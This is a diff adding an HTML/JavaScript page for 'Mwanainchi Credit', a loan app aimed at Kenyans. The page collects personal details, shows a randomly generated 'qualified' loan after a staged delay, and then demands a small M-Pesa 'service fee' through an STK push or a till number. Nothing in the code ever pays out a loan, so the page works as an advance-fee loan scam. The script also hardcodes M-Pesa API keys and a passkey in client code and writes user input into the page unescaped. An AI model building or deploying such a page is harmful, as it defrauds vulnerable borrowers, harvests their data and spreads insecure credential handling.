@@ -1,0 +1,1148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mwanainchi Credit - Quick Loans for Everyday Kenyans</title>
+    <meta name="description" content="Get instant loans between KSH 1,500 and KSH 3,500 with Mwanainchi Credit. Fast, secure, and accessible to all Kenyans.">
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💰</text></svg>">
+    <style>
+        /* Reset and Base Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        :root {
+            --primary: #1e5799;
+            --primary-dark: #154273;
+            --secondary: #6c757d;
+            --success: #2ecc71;
+            --danger: #e74c3c;
+            --light: #f8f9fa;
+            --dark: #333;
+            --shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            --border-radius: 15px;
+            --transition: all 0.3s ease;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen-Sans, Ubuntu, Cantarell, 'Helvetica Neue', sans-serif;
+            background: linear-gradient(135deg, var(--primary), #207cca);
+            color: var(--dark);
+            min-height: 100vh;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background-color: white;
+            border-radius: var(--border-radius);
+            box-shadow: var(--shadow);
+            overflow: hidden;
+        }
+        
+        /* Page Management */
+        .page {
+            display: none;
+            animation: fadeIn 0.5s ease;
+            padding: 30px;
+        }
+        
+        .active {
+            display: block;
+        }
+        
+        /* Header & Logo */
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding-top: 20px;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 15px;
+        }
+        
+        .logo-icon {
+            font-size: 48px;
+            color: var(--primary);
+        }
+        
+        .logo-text h1 {
+            font-size: 32px;
+            color: var(--primary);
+            margin-bottom: 5px;
+        }
+        
+        .logo-text p {
+            color: var(--secondary);
+            font-size: 16px;
+        }
+        
+        /* Buttons */
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            background-color: var(--primary);
+            color: white;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: var(--transition);
+            margin-top: 20px;
+            min-height: 50px;
+        }
+        
+        .btn:hover, .btn:focus {
+            background-color: var(--primary-dark);
+            transform: translateY(-2px);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .btn-secondary {
+            background-color: var(--secondary);
+        }
+        
+        .btn-secondary:hover, .btn-secondary:focus {
+            background-color: #545b62;
+        }
+        
+        /* Forms */
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        
+        input, select, textarea {
+            width: 100%;
+            padding: 12px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            -webkit-appearance: none;
+            -moz-appearance: none;
+            appearance: none;
+        }
+        
+        input:focus, select:focus, textarea:focus {
+            outline: none;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 2px rgba(30, 87, 153, 0.2);
+        }
+        
+        /* Details Summary */
+        .details-summary {
+            background-color: var(--light);
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        
+        .details-item {
+            margin-bottom: 10px;
+            display: flex;
+            justify-content: space-between;
+            border-bottom: 1px solid #eee;
+            padding-bottom: 5px;
+        }
+        
+        /* Loan Amount Display */
+        .loan-amount {
+            text-align: center;
+            font-size: 36px;
+            font-weight: bold;
+            color: var(--primary);
+            margin: 30px 0;
+        }
+        
+        /* Verification Details */
+        .verification-details {
+            background-color: var(--light);
+            padding: 20px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        
+        .service-fee {
+            text-align: center;
+            font-size: 24px;
+            color: var(--danger);
+            margin: 20px 0;
+        }
+        
+        /* Payment Methods */
+        .payment-methods {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin: 20px 0;
+        }
+        
+        .payment-method {
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            padding: 15px;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+        
+        .payment-method:hover {
+            border-color: var(--primary);
+        }
+        
+        .payment-method.active {
+            border-color: var(--primary);
+            background-color: #f0f7ff;
+        }
+        
+        .payment-icon {
+            font-size: 24px;
+            margin-right: 10px;
+        }
+        
+        /* Popups */
+        .popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.7);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .popup-content {
+            background-color: white;
+            padding: 30px;
+            border-radius: 10px;
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            margin: 20px;
+        }
+        
+        /* Loading Elements */
+        .spinner {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid var(--primary);
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        .loading-text {
+            text-align: center;
+            font-size: 18px;
+            margin: 20px 0;
+            color: var(--primary);
+        }
+        
+        /* Page Loader */
+        .page-loader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.95);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+        }
+        
+        .loader-content {
+            text-align: center;
+        }
+        
+        .loader-spinner {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid var(--primary);
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+        
+        /* Animations */
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        /* Notification */
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 15px 20px;
+            background-color: var(--success);
+            color: white;
+            border-radius: 5px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+            display: none;
+            z-index: 1001;
+            max-width: 300px;
+        }
+        
+        /* Footer */
+        .footer {
+            text-align: center;
+            padding: 20px;
+            margin-top: 20px;
+            border-top: 1px solid #eee;
+            color: var(--secondary);
+            font-size: 14px;
+        }
+        
+        /* Progress Bar */
+        .progress-bar {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 30px;
+            position: relative;
+        }
+        
+        .progress-bar::before {
+            content: '';
+            position: absolute;
+            top: 15px;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background-color: #e0e0e0;
+            z-index: 1;
+        }
+        
+        .progress-step {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background-color: #e0e0e0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .progress-step.active {
+            background-color: var(--primary);
+        }
+        
+        .progress-step.completed {
+            background-color: var(--success);
+        }
+        
+        /* Security Warning */
+        .security-warning {
+            background-color: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 20px 0;
+            font-size: 14px;
+            color: #856404;
+        }
+        
+        /* Responsive Design */
+        @media (max-width: 480px) {
+            .page {
+                padding: 20px;
+            }
+            
+            .logo-text h1 {
+                font-size: 24px;
+            }
+            
+            .logo-icon {
+                font-size: 36px;
+            }
+            
+            .btn {
+                padding: 12px;
+                min-height: 44px;
+            }
+            
+            .details-summary, .verification-details {
+                padding: 15px;
+            }
+        }
+        
+        @media (max-width: 320px) {
+            body {
+                padding: 10px;
+            }
+            
+            .page {
+                padding: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Page Loader -->
+    <div class="page-loader" id="page-loader">
+        <div class="loader-content">
+            <div class="loader-spinner"></div>
+            <h2>Loading Mwanainchi Credit</h2>
+            <p>Please wait while we prepare your application...</p>
+        </div>
+    </div>
+
+    <div class="container">
+        <!-- Page 1: Welcome -->
+        <div id="page-welcome" class="page active">
+            <div class="header">
+                <div class="logo">
+                    <div class="logo-icon">💰</div>
+                    <div class="logo-text">
+                        <h1>Mwanainchi Credit</h1>
+                        <p>Quick loans for everyday Kenyans</p>
+                    </div>
+                </div>
+            </div>
+            <button class="btn" onclick="showPage('page-register', 1)">Get Started</button>
+            
+            <div class="footer">
+                <p>Fast • Secure • Accessible</p>
+            </div>
+        </div>
+
+        <!-- Page 2: Register -->
+        <div id="page-register" class="page">
+            <div class="progress-bar">
+                <div class="progress-step completed">1</div>
+                <div class="progress-step active">2</div>
+                <div class="progress-step">3</div>
+                <div class="progress-step">4</div>
+                <div class="progress-step">5</div>
+            </div>
+            
+            <div class="header">
+                <div class="logo">
+                    <div class="logo-icon">🔐</div>
+                    <div class="logo-text">
+                        <h1>Welcome Back</h1>
+                        <p>Access your account or create a new one</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label for="phone">Phone Number</label>
+                <input type="tel" id="phone" placeholder="e.g. 0712345678" inputmode="numeric">
+            </div>
+            
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Enter your password">
+            </div>
+            
+            <button class="btn">Login</button>
+            <button class="btn btn-secondary" onclick="showPage('page-signup', 2)">Create Account</button>
+        </div>
+
+        <!-- Page 3: Sign Up -->
+        <div id="page-signup" class="page">
+            <div class="progress-bar">
+                <div class="progress-step completed">1</div>
+                <div class="progress-step completed">2</div>
+                <div class="progress-step active">3</div>
+                <div class="progress-step">4</div>
+                <div class="progress-step">5</div>
+            </div>
+            
+            <div class="header">
+                <div class="logo">
+                    <div class="logo-icon">📝</div>
+                    <div class="logo-text">
+                        <h1>Create Account</h1>
+                        <p>Fill in your details to get started</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label for="fullName">Full Name</label>
+                <input type="text" id="fullName" placeholder="Enter your full name">
+            </div>
+            
+            <div class="form-group">
+                <label for="phoneNumber">Phone Number</label>
+                <input type="tel" id="phoneNumber" placeholder="e.g. 0712345678" inputmode="numeric">
+            </div>
+            
+            <div class="form-group">
+                <label for="gender">Gender</label>
+                <select id="gender">
+                    <option value="">Select Gender</option>
+                    <option value="male">Male</option>
+                    <option value="female">Female</option>
+                    <option value="other">Other</option>
+                </select>
+            </div>
+            
+            <div class="form-group">
+                <label for="county">County</label>
+                <select id="county">
+                    <option value="">Select County</option>
+                </select>
+            </div>
+            
+            <div class="form-group">
+                <label for="dob">Date of Birth</label>
+                <input type="date" id="dob">
+            </div>
+            
+            <button class="btn" onclick="submitSignup()">Submit</button>
+        </div>
+
+        <!-- Page 4: Confirm Details -->
+        <div id="page-confirm" class="page">
+            <div class="progress-bar">
+                <div class="progress-step completed">1</div>
+                <div class="progress-step completed">2</div>
+                <div class="progress-step completed">3</div>
+                <div class="progress-step active">4</div>
+                <div class="progress-step">5</div>
+            </div>
+            
+            <div class="header">
+                <div class="logo">
+                    <div class="logo-icon">✅</div>
+                    <div class="logo-text">
+                        <h1>Confirm Details</h1>
+                        <p>Please verify your information</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="details-summary" id="details-summary">
+                <!-- Details will be populated by JavaScript -->
+            </div>
+            
+            <button class="btn" onclick="showPage('page-referral', 4)">Confirm</button>
+        </div>
+
+        <!-- Page 5: Referral -->
+        <div id="page-referral" class="page">
+            <div class="progress-bar">
+                <div class="progress-step completed">1</div>
+                <div class="progress-step completed">2</div>
+                <div class="progress-step completed">3</div>
+                <div class="progress-step completed">4</div>
+                <div class="progress-step active">5</div>
+            </div>
+            
+            <div class="header">
+                <div class="logo">
+                    <div class="logo-icon">👥</div>
+                    <div class="logo-text">
+                        <h1>Referral Details</h1>
+                        <p>Help us grow by referring friends (optional)</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label for="referralName">Referral Name</label>
+                <input type="text" id="referralName" placeholder="Enter referral name">
+            </div>
+            
+            <div class="form-group">
+                <label for="referralPhone">Referral Phone Number</label>
+                <input type="tel" id="referralPhone" placeholder="e.g. 0712345678" inputmode="numeric">
+            </div>
+            
+            <button class="btn" onclick="showPageWithDelay('page-loan', 5)">Continue</button>
+        </div>
+
+        <!-- Page 6: Loan Qualification -->
+        <div id="page-loan" class="page">
+            <div class="header">
+                <div class="logo">
+                    <div class="logo-icon">💸</div>
+                    <div class="logo-text">
+                        <h1>Loan Qualification</h1>
+                        <p>Based on your profile, you qualify for:</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div id="loan-loading" class="loading-text">
+                <div class="spinner"></div>
+                <p>Calculating your loan amount...</p>
+            </div>
+            
+            <div class="loan-amount" id="loan-amount" style="display: none;">
+                <!-- Loan amount will be populated by JavaScript -->
+            </div>
+            
+            <button class="btn" id="get-loan-btn" style="display: none;" onclick="showPage('page-verification', 6)">Get Loan</button>
+        </div>
+
+        <!-- Page 7: Verification -->
+        <div id="page-verification" class="page">
+            <div class="header">
+                <div class="logo">
+                    <div class="logo-icon">🔒</div>
+                    <div class="logo-text">
+                        <h1>Verification</h1>
+                        <p>Complete payment to receive your loan</p>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="security-warning">
+                <strong>Security Notice:</strong> This is a demo application. In production, M-Pesa credentials should never be exposed in frontend code.
+            </div>
+            
+            <div class="verification-details">
+                <div class="details-item">
+                    <span>Name:</span>
+                    <span id="verification-name"></span>
+                </div>
+                <div class="details-item">
+                    <span>Phone:</span>
+                    <span id="verification-phone"></span>
+                </div>
+                <div class="details-item">
+                    <span>Loan Amount:</span>
+                    <span id="verification-loan"></span>
+                </div>
+            </div>
+            
+            <div class="service-fee" id="service-fee">
+                <!-- Service fee will be populated by JavaScript -->
+            </div>
+            
+            <p>Select your preferred payment method:</p>
+            
+            <div class="payment-methods">
+                <div class="payment-method active" id="stk-payment" onclick="selectPaymentMethod('stk')">
+                    <span class="payment-icon">📱</span>
+                    <strong>M-Pesa STK Push</strong>
+                    <p>Pay instantly via M-Pesa. You will receive a prompt on your phone.</p>
+                </div>
+                
+                <div class="payment-method" id="till-payment" onclick="selectPaymentMethod('till')">
+                    <span class="payment-icon">🏪</span>
+                    <strong>Till Number</strong>
+                    <p>Pay via M-Pesa Buy Goods till number</p>
+                </div>
+            </div>
+            
+            <!-- STK Payment Section -->
+            <div id="stk-section">
+                <p>Click the button below to initiate M-Pesa payment. You will receive a prompt on your phone to enter your M-Pesa PIN.</p>
+                <button class="btn" onclick="initiateSTKPayment()">Pay with M-Pesa</button>
+            </div>
+            
+            <!-- Till Payment Section -->
+            <div id="till-section" style="display: none;">
+                <p>To complete your loan application, please pay the service fee using the following Till number:</p>
+                
+                <div class="till-number" id="till-number" onclick="copyToClipboard('123456')">
+                    Till Number: 123456
+                    <br>
+                    <small>(Click to copy)</small>
+                </div>
+                
+                <p>After payment, send the following message to 21111:</p>
+                
+                <textarea class="message-box" id="message-box" readonly></textarea>
+                
+                <button class="btn" onclick="showPopup()">I Have Paid</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Popup: Wait for message -->
+    <div class="popup" id="popup">
+        <div class="popup-content">
+            <div class="spinner"></div>
+            <h2>Processing Your Loan</h2>
+            <p>Please wait while we verify your payment. You will receive an SMS confirmation shortly.</p>
+            <button class="btn" onclick="hidePopup()">OK</button>
+        </div>
+    </div>
+
+    <!-- STK Processing Popup -->
+    <div class="popup" id="stk-popup">
+        <div class="popup-content">
+            <div class="spinner"></div>
+            <h2>Initiating M-Pesa Payment</h2>
+            <p>Please wait while we send an STK push to your phone...</p>
+            <div id="stk-status"></div>
+        </div>
+    </div>
+
+    <!-- Notification -->
+    <div class="notification" id="notification">
+        Till number copied to clipboard!
+    </div>
+
+    <script>
+        // M-Pesa Configuration
+        const MPESA_CONFIG = {
+            consumerKey: '3nwtgRz334lrLeBJH6tvElqGBRRSD9hSIoEIymtF8nuNlnj3',
+            consumerSecret: 'jodS2CG9qn3Nfwy973BmnvhfCPGwxZGeERqurapgGnXpZCMBbFahTbI5NhQaeeIk',
+            environment: 'sandbox', // Change to 'production' for live environment
+            businessShortCode: '174379',
+            passkey: 'bfb279f9aa9bdbcf158e97dd71a467cd2e0c893059b10f78e6b72ada1ed2c919',
+            callbackURL: 'https://your-domain.com/callback' // Update with your actual callback URL
+        };
+
+        // List of all counties in Kenya
+        const counties = [
+            "Mombasa", "Kwale", "Kilifi", "Tana River", "Lamu", "Taita-Taveta", "Garissa", "Wajir", "Mandera", 
+            "Marsabit", "Isiolo", "Meru", "Tharaka-Nithi", "Embu", "Kitui", "Machakos", "Makueni", "Nyandarua", 
+            "Nyeri", "Kirinyaga", "Murang'a", "Kiambu", "Turkana", "West Pokot", "Samburu", "Trans Nzoia", 
+            "Uasin Gishu", "Elgeyo-Marakwet", "Nandi", "Baringo", "Laikipia", "Nakuru", "Narok", "Kajiado", 
+            "Kericho", "Bomet", "Kakamega", "Vihiga", "Bungoma", "Busia", "Siaya", "Kisumu", "Homa Bay", 
+            "Migori", "Kisii", "Nyamira", "Nairobi"
+        ];
+
+        // Initialize the app
+        document.addEventListener('DOMContentLoaded', function() {
+            // Simulate page loading
+            setTimeout(function() {
+                document.getElementById('page-loader').style.display = 'none';
+                document.getElementById('page-welcome').classList.add('active');
+            }, 2000);
+
+            // Populate counties dropdown
+            const countySelect = document.getElementById('county');
+            counties.forEach(county => {
+                const option = document.createElement('option');
+                option.value = county;
+                option.textContent = county;
+                countySelect.appendChild(option);
+            });
+
+            // Generate random service fee
+            generateServiceFee();
+        });
+
+        // Function to show specific page
+        function showPage(pageId, step) {
+            // Hide all pages
+            const pages = document.querySelectorAll('.page');
+            pages.forEach(page => {
+                page.classList.remove('active');
+            });
+            
+            // Show the requested page
+            document.getElementById(pageId).classList.add('active');
+            
+            // If showing the verification page, populate the details
+            if (pageId === 'page-verification') {
+                populateVerificationDetails();
+            }
+            
+            // Update progress bar if step is provided
+            if (step) {
+                updateProgressBar(step);
+            }
+            
+            // Scroll to top for better mobile UX
+            window.scrollTo(0, 0);
+        }
+
+        // Function to update progress bar
+        function updateProgressBar(currentStep) {
+            const progressSteps = document.querySelectorAll('.progress-step');
+            progressSteps.forEach((step, index) => {
+                if (index + 1 < currentStep) {
+                    step.classList.add('completed');
+                    step.classList.remove('active');
+                } else if (index + 1 === currentStep) {
+                    step.classList.add('active');
+                    step.classList.remove('completed');
+                } else {
+                    step.classList.remove('active', 'completed');
+                }
+            });
+        }
+
+        // Function to show page with delay (for loan qualification)
+        function showPageWithDelay(pageId, step) {
+            // Hide all pages
+            const pages = document.querySelectorAll('.page');
+            pages.forEach(page => {
+                page.classList.remove('active');
+            });
+            
+            // Show the requested page
+            document.getElementById(pageId).classList.add('active');
+            
+            // Update progress bar
+            updateProgressBar(step);
+            
+            // If showing the loan page, generate a new loan amount after delay
+            if (pageId === 'page-loan') {
+                // Show loading state
+                document.getElementById('loan-loading').style.display = 'block';
+                document.getElementById('loan-amount').style.display = 'none';
+                document.getElementById('get-loan-btn').style.display = 'none';
+                
+                // Generate loan amount after 5 seconds
+                setTimeout(function() {
+                    generateLoanAmount();
+                    document.getElementById('loan-loading').style.display = 'none';
+                    document.getElementById('loan-amount').style.display = 'block';
+                    document.getElementById('get-loan-btn').style.display = 'block';
+                }, 5000);
+            }
+            
+            // Scroll to top for better mobile UX
+            window.scrollTo(0, 0);
+        }
+
+        // Function to submit signup form
+        function submitSignup() {
+            const fullName = document.getElementById('fullName').value;
+            const phoneNumber = document.getElementById('phoneNumber').value;
+            const gender = document.getElementById('gender').value;
+            const county = document.getElementById('county').value;
+            const dob = document.getElementById('dob').value;
+            
+            // Basic validation
+            if (!fullName || !phoneNumber || !gender || !county || !dob) {
+                alert('Please fill in all fields');
+                return;
+            }
+            
+            // Phone number validation for Kenya
+            const phoneRegex = /^(07\d{8}|01\d{8}|\+2547\d{8}|\+2541\d{8})$/;
+            if (!phoneRegex.test(phoneNumber.replace(/\s/g, ''))) {
+                alert('Please enter a valid Kenyan phone number');
+                return;
+            }
+            
+            // Store user data
+            const userData = {
+                fullName,
+                phoneNumber,
+                gender,
+                county,
+                dob
+            };
+            
+            localStorage.setItem('userData', JSON.stringify(userData));
+            
+            // Populate confirmation page
+            const detailsSummary = document.getElementById('details-summary');
+            detailsSummary.innerHTML = `
+                <div class="details-item">
+                    <span>Name:</span>
+                    <span>${fullName}</span>
+                </div>
+                <div class="details-item">
+                    <span>Phone:</span>
+                    <span>${phoneNumber}</span>
+                </div>
+                <div class="details-item">
+                    <span>Gender:</span>
+                    <span>${gender.charAt(0).toUpperCase() + gender.slice(1)}</span>
+                </div>
+                <div class="details-item">
+                    <span>County:</span>
+                    <span>${county}</span>
+                </div>
+                <div class="details-item">
+                    <span>Date of Birth:</span>
+                    <span>${new Date(dob).toLocaleDateString()}</span>
+                </div>
+            `;
+            
+            // Show confirmation page
+            showPage('page-confirm', 4);
+        }
+
+        // Function to generate random loan amount
+        function generateLoanAmount() {
+            const minLoan = 1500;
+            const maxLoan = 3500;
+            const loanAmount = Math.floor(Math.random() * (maxLoan - minLoan + 1)) + minLoan;
+            
+            document.getElementById('loan-amount').textContent = `KSH ${loanAmount.toLocaleString()}`;
+            
+            // Store loan amount
+            localStorage.setItem('loanAmount', loanAmount);
+        }
+
+        // Function to generate random service fee
+        function generateServiceFee() {
+            const minFee = 95;
+            const maxFee = 110;
+            const serviceFee = Math.floor(Math.random() * (maxFee - minFee + 1)) + minFee;
+            
+            // Store service fee
+            localStorage.setItem('serviceFee', serviceFee);
+        }
+
+        // Function to populate verification details
+        function populateVerificationDetails() {
+            const userData = JSON.parse(localStorage.getItem('userData'));
+            const loanAmount = localStorage.getItem('loanAmount');
+            const serviceFee = localStorage.getItem('serviceFee');
+            
+            if (userData) {
+                document.getElementById('verification-name').textContent = userData.fullName;
+                document.getElementById('verification-phone').textContent = userData.phoneNumber;
+                document.getElementById('verification-loan').textContent = `KSH ${parseInt(loanAmount).toLocaleString()}`;
+                document.getElementById('service-fee').textContent = `Service Fee: KSH ${serviceFee}`;
+                
+                // Generate message for till payment
+                const message = `Pay KSH ${serviceFee} to Till 123456 for Mwanainchi Credit loan`;
+                document.getElementById('message-box').value = message;
+            }
+        }
+
+        // Function to select payment method
+        function selectPaymentMethod(method) {
+            // Update UI
+            document.getElementById('stk-payment').classList.toggle('active', method === 'stk');
+            document.getElementById('till-payment').classList.toggle('active', method === 'till');
+            
+            // Show/hide sections
+            document.getElementById('stk-section').style.display = method === 'stk' ? 'block' : 'none';
+            document.getElementById('till-section').style.display = method === 'till' ? 'block' : 'none';
+        }
+
+        // Function to get M-Pesa access token
+        async function getMpesaAccessToken() {
+            try {
+                const auth = btoa(`${MPESA_CONFIG.consumerKey}:${MPESA_CONFIG.consumerSecret}`);
+                const url = MPESA_CONFIG.environment === 'sandbox' 
+                    ? 'https://sandbox.safaricom.co.ke/oauth/v1/generate?grant_type=client_credentials'
+                    : 'https://api.safaricom.co.ke/oauth/v1/generate?grant_type=client_credentials';
+                
+                const response = await fetch(url, {
+                    method: 'GET',
+                    headers: {
+                        'Authorization': `Basic ${auth}`
+                    }
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`HTTP error! status: ${response.status}`);
+                }
+                
+                const data = await response.json();
+                return data.access_token;
+            } catch (error) {
+                console.error('Error getting access token:', error);
+                throw error;
+            }
+        }
+
+        // Function to generate timestamp
+        function generateTimestamp() {
+            const now = new Date();
+            const year = now.getFullYear();
+            const month = String(now.getMonth() + 1).padStart(2, '0');
+            const day = String(now.getDate()).padStart(2, '0');
+            const hour = String(now.getHours()).padStart(2, '0');
+            const minute = String(now.getMinutes()).padStart(2, '0');
+            const second = String(now.getSeconds()).padStart(2, '0');
+            
+            return `${year}${month}${day}${hour}${minute}${second}`;
+        }
+
+        // Function to generate password
+        function generatePassword(businessShortCode, passkey, timestamp) {
+            const data = businessShortCode + passkey + timestamp;
+            return btoa(data);
+        }
+
+        // Function to initiate STK payment
+        async function initiateSTKPayment() {
+            const userData = JSON.parse(localStorage.getItem('userData'));
+            const serviceFee = localStorage.getItem('serviceFee');
+            
+            if (!userData) {
+                alert('User data not found. Please restart the application.');
+                return;
+            }
+            
+            // Show processing popup
+            document.getElementById('stk-popup').style.display = 'flex';
+            document.getElementById('stk-status').innerHTML = '<p>Initiating payment request...</p>';
+            
+            try {
+                // Get access token
+                document.getElementById('stk-status').innerHTML = '<p>Authenticating with M-Pesa...</p>';
+                const accessToken = await getMpesaAccessToken();
+                
+                // Generate required parameters
+                const timestamp = generateTimestamp();
+                const password = generatePassword(MPESA_CONFIG.businessShortCode, MPESA_CONFIG.passkey, timestamp);
+                
+                // Prepare STK push request
+                const stkRequest = {
+                    BusinessShortCode: MPESA_CONFIG.businessShortCode,
+                    Password: password,
+                    Timestamp: timestamp,
+                    TransactionType: "CustomerPayBillOnline",
+                    Amount: serviceFee,
+                    PartyA: userData.phoneNumber,
+                    PartyB: MPESA_CONFIG.businessShortCode,
+                    PhoneNumber: userData.phoneNumber,
+                    CallBackURL: MPESA_CONFIG.callbackURL,
+                    AccountReference: "Mwanainchi Credit",
+                    TransactionDesc: "Loan Service Fee"
+                };
+                
+                // Send STK push request
+                document.getElementById('stk-status').innerHTML = '<p>Sending payment request to your phone...</p>';
+                
+                const stkUrl = MPESA_CONFIG.environment === 'sandbox'
+                    ? 'https://sandbox.safaricom.co.ke/mpesa/stkpush/v1/processrequest'
+                    : 'https://api.safaricom.co.ke/mpesa/stkpush/v1/processrequest';
+                
+                const response = await fetch(stkUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': `Bearer ${accessToken}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(stkRequest)
+                });
+                
+                if (!response.ok) {
+                    throw new Error(`STK push failed with status: ${response.status}`);
+                }
+                
+                const result = await response.json();
+                
+                if (result.ResponseCode === "0") {
+                    document.getElementById('stk-status').innerHTML = `
+                        <p style="color: green;">✅ STK push sent successfully!</p>
+                        <p>Check your phone to complete the payment.</p>
+                        <p>Merchant Request ID: ${result.MerchantRequestID}</p>
+                        <p>Checkout Request ID: ${result.CheckoutRequestID}</p>
+                        <p>You will receive a confirmation message shortly.</p>
+                    `;
+                    
+                    // Store transaction details
+                    localStorage.setItem('transactionDetails', JSON.stringify({
+                        merchantRequestID: result.MerchantRequestID,
+                        checkoutRequestID: result.CheckoutRequestID,
+                        responseDescription: result.ResponseDescription
+                    }));
+                    
+                    // Simulate waiting for payment confirmation
+                    setTimeout(() => {
+                        document.getElementById('stk-popup').style.display = 'none';
+                        showPopup(); // Show the success popup
+                    }, 5000);
+                } else {
+                    throw new Error(`STK push failed: ${result.ResponseDescription}`);
+                }
+                
+            } catch (error) {
+                console.error('STK Payment Error:', error);
+                document.getElementById('stk-status').innerHTML = `
+                    <p style="color: red;">❌ Payment failed: ${error.message}</p>
+                    <p>Please try again or use the Till payment method.</p>
+                `;
+                
+                // Hide the popup after 5 seconds
+                setTimeout(() => {
+                    document.getElementById('stk-popup').style.display = 'none';
+                }, 5000);
+            }
+        }
+
+        // Function to copy Till number to clipboard
+        function copyToClipboard(text) {
+            if (navigator.clipboard && window.isSecureContext) {
+                navigator.clipboard.writeText(text).then(() => {
+                    showNotification();
+                }).catch(err => {
+                    fallbackCopyTextToClipboard(text);
+                });
+            } else {
+                fallbackCopyTextToClipboard(text);
+            }
+        }
+
+        // Fallback method for older browsers
+        function fallbackCopyTextToClipboard(text) {
+            const textArea = document.createElement('textarea');
+            textArea.value = text;
+            textArea.style.position = 'fixed';
+            textArea.style.opacity = '0';
+            document.body.appendChild(textArea);
+            textArea.focus();
+            textArea.select();
+            
+            try {
+                const successful = document.execCommand('copy');
+                if (successful) {
+                    showNotification();
+                }
+            } catch (err) {
+                console.error('Fallback: Unable to copy', err);
+            }
+            
+            document.body.removeChild(textArea);
+        }
+
+        // Show notification
+        function showNotification() {
+            const notification = document.getElementById('notification');
+            notification.style.display = 'block';
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 3000);
+        }
+
+        // Function to show popup
+        function showPopup() {
+            document.getElementById('popup').style.display = 'flex';
+        }
+
+        // Function to hide popup
+        function hidePopup() {
+            document.getElementById('popup').style.display = 'none';
+        }
+    </script>
+</body>
+</html>
